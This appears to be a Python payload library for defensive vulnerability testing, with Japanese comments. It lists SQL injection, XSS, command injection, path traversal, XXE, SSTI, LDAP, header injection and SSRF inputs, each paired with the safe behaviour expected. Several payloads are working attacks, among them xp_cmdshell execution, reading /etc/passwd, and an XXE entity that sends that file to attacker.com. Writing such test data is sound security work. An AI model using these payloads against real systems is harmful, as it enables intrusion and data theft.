#!/usr/bin/env python3
"""
脆弱性テストペイロード集 - Ultimate ShunsukeModel Ecosystem

各種脆弱性テストに使用するペイロードとテストパターンの
包括的なライブラリ
"""

from typing import List, Dict, Any, Tuple
from enum import Enum
import base64
import urllib.parse


class PayloadCategory(Enum):
    """ペイロードカテゴリ"""
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    XXE = "xml_external_entity"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    SSTI = "server_side_template_injection"
    SSRF = "server_side_request_forgery"
    HEADER_INJECTION = "header_injection"


class VulnerabilityPayloads:
    """脆弱性テストペイロード管理クラス"""
    
    @staticmethod
    def get_sql_injection_payloads() -> List[Dict[str, Any]]:
        """SQLインジェクションペイロード"""
        return [
            # 基本的な認証バイパス
            {
                'payload': "' OR '1'='1",
                'description': 'Basic authentication bypass',
                'severity': 'high',
                'expected_behavior': 'Should not bypass authentication'
            },
            {
                'payload': "' OR '1'='1' --",
                'description': 'Authentication bypass with comment',
                'severity': 'high',
                'expected_behavior': 'Should not bypass authentication'
            },
            {
                'payload': "admin'--",
                'description': 'Admin login bypass',
                'severity': 'critical',
                'expected_behavior': 'Should not allow admin access'
            },
            
            # UNION攻撃
            {
                'payload': "' UNION SELECT NULL--",
                'description': 'UNION attack probe',
                'severity': 'high',
                'expected_behavior': 'Should not reveal column count'
            },
            {
                'payload': "' UNION SELECT username, password FROM users--",
                'description': 'Data extraction attempt',
                'severity': 'critical',
                'expected_behavior': 'Should not expose user data'
            },
            
            # ブラインドSQLインジェクション
            {
                'payload': "' AND '1'='1",
                'description': 'Blind SQL injection true condition',
                'severity': 'medium',
                'expected_behavior': 'Should not change behavior'
            },
            {
                'payload': "' AND '1'='2",
                'description': 'Blind SQL injection false condition',
                'severity': 'medium',
                'expected_behavior': 'Should not change behavior'
            },
            {
                'payload': "' AND SLEEP(5)--",
                'description': 'Time-based blind SQL injection',
                'severity': 'high',
                'expected_behavior': 'Should not delay response'
            },
            
            # エラーベースインジェクション
            {
                'payload': "' AND 1=CONVERT(int, @@version)--",
                'description': 'Error-based version extraction',
                'severity': 'high',
                'expected_behavior': 'Should not reveal database version'
            },
            
            # ストアドプロシージャ
            {
                'payload': "'; EXEC xp_cmdshell('dir')--",
                'description': 'Command execution via xp_cmdshell',
                'severity': 'critical',
                'expected_behavior': 'Should not execute system commands'
            },
            
            # 二次SQLインジェクション
            {
                'payload': "Robert'); DROP TABLE students;--",
                'description': 'Bobby Tables attack',
                'severity': 'critical',
                'expected_behavior': 'Should properly escape stored data'
            }
        ]
    
    @staticmethod
    def get_xss_payloads() -> List[Dict[str, Any]]:
        """クロスサイトスクリプティングペイロード"""
        return [
            # 基本的なXSS
            {
                'payload': '<script>alert("XSS")</script>',
                'description': 'Basic script injection',
                'severity': 'high',
                'expected_behavior': 'Should escape or sanitize'
            },
            {
                'payload': '<img src=x onerror=alert("XSS")>',
                'description': 'Image tag with onerror',
                'severity': 'high',
                'expected_behavior': 'Should remove event handlers'
            },
            
            # エンコードされたXSS
            {
                'payload': '<script>alert(String.fromCharCode(88,83,83))</script>',
                'description': 'Character code obfuscation',
                'severity': 'medium',
                'expected_behavior': 'Should detect encoded payloads'
            },
            {
                'payload': '&#60;script&#62;alert("XSS")&#60;/script&#62;',
                'description': 'HTML entity encoding',
                'severity': 'medium',
                'expected_behavior': 'Should handle HTML entities'
            },
            
            # イベントハンドラXSS
            {
                'payload': '<body onload=alert("XSS")>',
                'description': 'Body onload event',
                'severity': 'high',
                'expected_behavior': 'Should strip event handlers'
            },
            {
                'payload': '<input type="text" onfocus=alert("XSS") autofocus>',
                'description': 'Autofocus with event handler',
                'severity': 'high',
                'expected_behavior': 'Should remove dangerous attributes'
            },
            
            # SVG XSS
            {
                'payload': '<svg onload=alert("XSS")>',
                'description': 'SVG-based XSS',
                'severity': 'high',
                'expected_behavior': 'Should sanitize SVG content'
            },
            {
                'payload': '<svg><script>alert("XSS")</script></svg>',
                'description': 'Script in SVG',
                'severity': 'high',
                'expected_behavior': 'Should remove scripts from SVG'
            },
            
            # データURIスキーム
            {
                'payload': '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
                'description': 'Data URI scheme attack',
                'severity': 'high',
                'expected_behavior': 'Should block data URIs'
            },
            
            # JavaScript URI
            {
                'payload': '<a href="javascript:alert(\'XSS\')">Click</a>',
                'description': 'JavaScript URI',
                'severity': 'high',
                'expected_behavior': 'Should sanitize javascript: URIs'
            },
            
            # DOM XSS
            {
                'payload': '#<script>alert("XSS")</script>',
                'description': 'DOM-based XSS via fragment',
                'severity': 'medium',
                'expected_behavior': 'Should validate URL fragments'
            }
        ]
    
    @staticmethod
    def get_command_injection_payloads() -> List[Dict[str, Any]]:
        """コマンドインジェクションペイロード"""
        return [
            # 基本的なコマンドインジェクション
            {
                'payload': '; ls -la',
                'description': 'Basic command injection',
                'severity': 'critical',
                'expected_behavior': 'Should not execute commands'
            },
            {
                'payload': '| whoami',
                'description': 'Pipe command injection',
                'severity': 'critical',
                'expected_behavior': 'Should not reveal user'
            },
            {
                'payload': '&& cat /etc/passwd',
                'description': 'AND command injection',
                'severity': 'critical',
                'expected_behavior': 'Should not read sensitive files'
            },
            
            # バッククォート
            {
                'payload': '`id`',
                'description': 'Backtick command substitution',
                'severity': 'critical',
                'expected_behavior': 'Should not execute in backticks'
            },
            {
                'payload': '$(whoami)',
                'description': 'Dollar parenthesis substitution',
                'severity': 'critical',
                'expected_behavior': 'Should not execute substitution'
            },
            
            # 改行インジェクション
            {
                'payload': 'test\ncat /etc/passwd',
                'description': 'Newline injection',
                'severity': 'high',
                'expected_behavior': 'Should handle newlines safely'
            },
            
            # 環境変数
            {
                'payload': '${PATH}',
                'description': 'Environment variable access',
                'severity': 'medium',
                'expected_behavior': 'Should not expose env vars'
            },
            
            # リダイレクト
            {
                'payload': '> /tmp/test.txt',
                'description': 'Output redirection',
                'severity': 'medium',
                'expected_behavior': 'Should not create files'
            },
            
            # 複雑なペイロード
            {
                'payload': '; python -c "import os; os.system(\'ls\')"',
                'description': 'Python command execution',
                'severity': 'critical',
                'expected_behavior': 'Should not execute Python'
            }
        ]
    
    @staticmethod
    def get_path_traversal_payloads() -> List[Dict[str, Any]]:
        """パストラバーサルペイロード"""
        return [
            # 基本的なトラバーサル
            {
                'payload': '../',
                'description': 'Basic directory traversal',
                'severity': 'high',
                'expected_behavior': 'Should not allow parent directory access'
            },
            {
                'payload': '../../etc/passwd',
                'description': 'Unix password file access',
                'severity': 'critical',
                'expected_behavior': 'Should not read system files'
            },
            {
                'payload': '..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'description': 'Windows hosts file access',
                'severity': 'critical',
                'expected_behavior': 'Should not read Windows files'
            },
            
            # エンコードされたトラバーサル
            {
                'payload': '%2e%2e%2f',
                'description': 'URL encoded traversal',
                'severity': 'high',
                'expected_behavior': 'Should decode and block'
            },
            {
                'payload': '..%252f',
                'description': 'Double URL encoding',
                'severity': 'high',
                'expected_behavior': 'Should handle double encoding'
            },
            
            # Unicode/UTF-8
            {
                'payload': '..%c0%af',
                'description': 'Unicode encoding bypass',
                'severity': 'high',
                'expected_behavior': 'Should normalize Unicode'
            },
            
            # 絶対パス
            {
                'payload': '/etc/passwd',
                'description': 'Absolute path access',
                'severity': 'high',
                'expected_behavior': 'Should restrict to allowed paths'
            },
            {
                'payload': 'C:\\Windows\\system.ini',
                'description': 'Windows absolute path',
                'severity': 'high',
                'expected_behavior': 'Should block absolute paths'
            },
            
            # Null byte
            {
                'payload': '../../../etc/passwd%00.jpg',
                'description': 'Null byte injection',
                'severity': 'high',
                'expected_behavior': 'Should handle null bytes'
            }
        ]
    
    @staticmethod
    def get_xxe_payloads() -> List[Dict[str, Any]]:
        """XML外部エンティティペイロード"""
        return [
            # 基本的なXXE
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',
                'description': 'Basic XXE file read',
                'severity': 'critical',
                'expected_behavior': 'Should disable external entities'
            },
            
            # パラメータエンティティ
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%xxe;'>">
  %eval;
  %exfiltrate;
]>''',
                'description': 'Parameter entity XXE',
                'severity': 'critical',
                'expected_behavior': 'Should block parameter entities'
            },
            
            # SSRF via XXE
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server:8080/">]>
<data>&xxe;</data>''',
                'description': 'SSRF through XXE',
                'severity': 'high',
                'expected_behavior': 'Should not make internal requests'
            },
            
            # Billion laughs
            {
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
                'description': 'Billion laughs DoS',
                'severity': 'high',
                'expected_behavior': 'Should limit entity expansion'
            }
        ]
    
    @staticmethod
    def get_ssti_payloads() -> List[Dict[str, Any]]:
        """サーバーサイドテンプレートインジェクションペイロード"""
        return [
            # Jinja2
            {
                'payload': '{{7*7}}',
                'description': 'Basic math expression',
                'severity': 'medium',
                'expected_behavior': 'Should not evaluate expressions'
            },
            {
                'payload': '{{config}}',
                'description': 'Config object access',
                'severity': 'high',
                'expected_behavior': 'Should not expose config'
            },
            {
                'payload': "{{''.__class__.__mro__[1].__subclasses__()}}",
                'description': 'Python class access',
                'severity': 'critical',
                'expected_behavior': 'Should not allow class access'
            },
            
            # ERB (Ruby)
            {
                'payload': '<%= 7 * 7 %>',
                'description': 'ERB expression',
                'severity': 'medium',
                'expected_behavior': 'Should not evaluate Ruby'
            },
            {
                'payload': '<%= `ls` %>',
                'description': 'ERB command execution',
                'severity': 'critical',
                'expected_behavior': 'Should not execute commands'
            },
            
            # Freemarker
            {
                'payload': '${7*7}',
                'description': 'Freemarker expression',
                'severity': 'medium',
                'expected_behavior': 'Should escape template syntax'
            },
            
            # Velocity
            {
                'payload': '#set($x=7*7)$x',
                'description': 'Velocity template',
                'severity': 'medium',
                'expected_behavior': 'Should not process Velocity'
            }
        ]
    
    @staticmethod
    def get_ldap_injection_payloads() -> List[Dict[str, Any]]:
        """LDAPインジェクションペイロード"""
        return [
            # 基本的なLDAPインジェクション
            {
                'payload': '*',
                'description': 'Wildcard injection',
                'severity': 'medium',
                'expected_behavior': 'Should escape wildcards'
            },
            {
                'payload': 'admin)(&(password=*))',
                'description': 'Filter injection',
                'severity': 'high',
                'expected_behavior': 'Should validate filter syntax'
            },
            {
                'payload': 'admin)(|(password=*',
                'description': 'OR injection',
                'severity': 'high',
                'expected_behavior': 'Should prevent filter manipulation'
            },
            
            # Null byte
            {
                'payload': 'admin\x00)',
                'description': 'Null byte injection',
                'severity': 'high',
                'expected_behavior': 'Should handle null bytes'
            }
        ]
    
    @staticmethod
    def get_header_injection_payloads() -> List[Dict[str, Any]]:
        """HTTPヘッダーインジェクションペイロード"""
        return [
            # CRLF インジェクション
            {
                'payload': 'test\r\nSet-Cookie: admin=true',
                'description': 'CRLF injection with cookie',
                'severity': 'high',
                'expected_behavior': 'Should strip CRLF'
            },
            {
                'payload': 'test\r\n\r\n<script>alert(1)</script>',
                'description': 'Response splitting',
                'severity': 'high',
                'expected_behavior': 'Should prevent response splitting'
            },
            
            # ヘッダー値操作
            {
                'payload': 'test\nX-Forwarded-For: 127.0.0.1',
                'description': 'Header injection',
                'severity': 'medium',
                'expected_behavior': 'Should validate header values'
            }
        ]
    
    @staticmethod
    def get_ssrf_payloads() -> List[Dict[str, Any]]:
        """サーバーサイドリクエストフォージェリペイロード"""
        return [
            # 内部アドレス
            {
                'payload': 'http://127.0.0.1:8080',
                'description': 'Localhost access',
                'severity': 'high',
                'expected_behavior': 'Should block internal IPs'
            },
            {
                'payload': 'http://192.168.1.1',
                'description': 'Private network access',
                'severity': 'high',
                'expected_behavior': 'Should block private ranges'
            },
            {
                'payload': 'http://169.254.169.254',
                'description': 'AWS metadata access',
                'severity': 'critical',
                'expected_behavior': 'Should block metadata endpoints'
            },
            
            # プロトコル
            {
                'payload': 'file:///etc/passwd',
                'description': 'File protocol',
                'severity': 'critical',
                'expected_behavior': 'Should restrict to HTTP(S)'
            },
            {
                'payload': 'gopher://localhost:8080',
                'description': 'Gopher protocol',
                'severity': 'high',
                'expected_behavior': 'Should block gopher'
            },
            
            # DNS リバインディング
            {
                'payload': 'http://spoofed.burpcollaborator.net',
                'description': 'DNS rebinding',
                'severity': 'medium',
                'expected_behavior': 'Should validate DNS resolution'
            },
            
            # URLエンコーディング
            {
                'payload': 'http://127.0.0.1:8080',
                'description': 'Encoded localhost',
                'severity': 'high',
                'expected_behavior': 'Should decode and validate'
            }
        ]
    
    @staticmethod
    def get_all_payloads() -> Dict[PayloadCategory, List[Dict[str, Any]]]:
        """全ペイロード取得"""
        return {
            PayloadCategory.SQL_INJECTION: VulnerabilityPayloads.get_sql_injection_payloads(),
            PayloadCategory.XSS: VulnerabilityPayloads.get_xss_payloads(),
            PayloadCategory.COMMAND_INJECTION: VulnerabilityPayloads.get_command_injection_payloads(),
            PayloadCategory.PATH_TRAVERSAL: VulnerabilityPayloads.get_path_traversal_payloads(),
            PayloadCategory.XXE: VulnerabilityPayloads.get_xxe_payloads(),
            PayloadCategory.SSTI: VulnerabilityPayloads.get_ssti_payloads(),
            PayloadCategory.LDAP_INJECTION: VulnerabilityPayloads.get_ldap_injection_payloads(),
            PayloadCategory.HEADER_INJECTION: VulnerabilityPayloads.get_header_injection_payloads(),
            PayloadCategory.SSRF: VulnerabilityPayloads.get_ssrf_payloads()
        }
    
    @staticmethod
    def encode_payload(payload: str, encoding_type: str) -> str:
        """ペイロードのエンコード"""
        if encoding_type == 'url':
            return urllib.parse.quote(payload)
        elif encoding_type == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'html_entity':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding_type == 'unicode':
            return payload.encode('unicode_escape').decode()
        else:
            return payload
    
    @staticmethod
    def generate_fuzzing_strings() -> List[str]:
        """ファジング用文字列生成"""
        return [
            # 長い文字列
            'A' * 1000,
            'A' * 10000,
            'A' * 100000,
            
            # 特殊文字
            '!@#$%^&*()_+-=[]{}|;\':",./<>?',
            '\x00\x01\x02\x03\x04\x05',
            '\r\n\r\n',
            
            # Unicode
            '𝕊𝕦𝕡𝕖𝕣𝕊𝕔𝕣𝕚𝕡𝕥',
            '﷽﷽﷽﷽﷽',
            '🔥💉🎯🔓🔑',
            
            # フォーマット文字列
            '%s%s%s%s%s',
            '%n%n%n%n%n',
            '%x%x%x%x%x',
            '{0}{1}{2}{3}',
            
            # 数値
            '-1',
            '0',
            '2147483647',  # MAX_INT
            '2147483648',  # MAX_INT + 1
            '9999999999999999999999999999999',
            
            # 空白文字
            ' ',
            '\t',
            '\n',
            '\r',
            '\u00A0',  # Non-breaking space
            
            # 予約語
            'true',
            'false',
            'null',
            'undefined',
            'NaN',
            'Infinity'
        ]


# 使用例とテスト
if __name__ == "__main__":
    # SQLインジェクションペイロード表示
    print("=== SQL Injection Payloads ===")
    for payload_info in VulnerabilityPayloads.get_sql_injection_payloads()[:3]:
        print(f"Payload: {payload_info['payload']}")
        print(f"Description: {payload_info['description']}")
        print(f"Severity: {payload_info['severity']}")
        print()
    
    # エンコーディング例
    print("=== Encoding Examples ===")
    test_payload = "<script>alert('XSS')</script>"
    print(f"Original: {test_payload}")
    print(f"URL Encoded: {VulnerabilityPayloads.encode_payload(test_payload, 'url')}")
    print(f"Base64: {VulnerabilityPayloads.encode_payload(test_payload, 'base64')}")
    print(f"HTML Entity: {VulnerabilityPayloads.encode_payload(test_payload, 'html_entity')}")
    
    # ファジング文字列
    print("\n=== Fuzzing Strings (first 5) ===")
    for fuzz_string in VulnerabilityPayloads.generate_fuzzing_strings()[:5]:
        print(f"Length {len(fuzz_string)}: {repr(fuzz_string[:50])}...")